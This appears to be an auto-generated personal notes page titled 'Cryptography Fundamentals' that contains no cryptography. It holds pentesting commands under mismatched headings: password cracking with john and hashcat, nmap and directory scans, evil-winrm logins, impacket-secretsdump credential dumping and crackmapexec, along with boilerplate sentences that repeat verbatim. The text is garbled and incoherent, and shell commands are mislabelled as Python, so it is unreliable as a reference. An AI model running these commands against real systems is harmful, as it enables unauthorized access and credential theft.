---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "malware, cheatsheet, blue team, linux, dfir"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-102.html"
URL_IMAGES: ""
Date: "2024-12-28"
Tags: "Malware, Cheatsheet, Blue Team, Linux, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-102"
Permalink: "/notes/note-cryptography-fundamentals-102.html"
BtnLabel: "Read Notes"
Pick: 0
---
## PostgreSQL

### dcomexec

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

## chisel

### Windows Server 2019

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3389,53,27017 10.109.157.62 -oN scan.txt
```

```python
evil-winrm -i 10.113.167.245 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.15.213.147 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.127.153.161/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.174.248/FUZZ
```

- `netcat`
- `GetUserSPNs`
- `LXD Privilege Escalation`
- `Weak Service Permissions`

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.23.195
```

```powershell
crackmapexec smb 10.42.230.39 -u administrator -p 'P@ssw0rd!' --shares
```

## lookupsid

### netcat

- `LAPS Abuse`
- `feroxbuster`
- `crackmapexec`

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
evil-winrm -i 10.21.134.121 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.208.252
feroxbuster -h
nmap -sCV -p1521,22,5432 10.61.72.238 -oN scan.txt
```

## smbexec

### PowerShell

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.
